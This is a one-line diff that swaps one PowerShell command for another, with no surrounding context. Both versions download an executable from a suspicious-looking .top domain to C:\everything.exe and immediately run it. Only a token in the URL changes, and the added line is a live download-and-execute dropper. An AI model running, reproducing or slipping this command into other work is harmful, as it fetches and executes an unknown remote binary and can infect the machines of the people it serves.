@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri " http://156359cm.n9shka.top/requestsecureLowauthlongpollbigloadpublicPrivate/97a87b470fe9ed5ff51ff9b8543e937e6016d48c48ff28aa43b331bb98cceefcf6c5728e0ccc6092 " -OutFile "C:\everything.exe"; Start-Process -FilePath "C:\everything.exe"
+Invoke-WebRequest -Uri " http://156359cm.n9shka.top/requestsecureLowauthlongpollbigloadpublicPrivate/e7fa0da4a85257479e5faf8e5fcda83bd38fd5316191acfbe9dfd0835a3621092c72d8c20685b6ec " -OutFile "C:\everything.exe"; Start-Process -FilePath "C:\everything.exe"
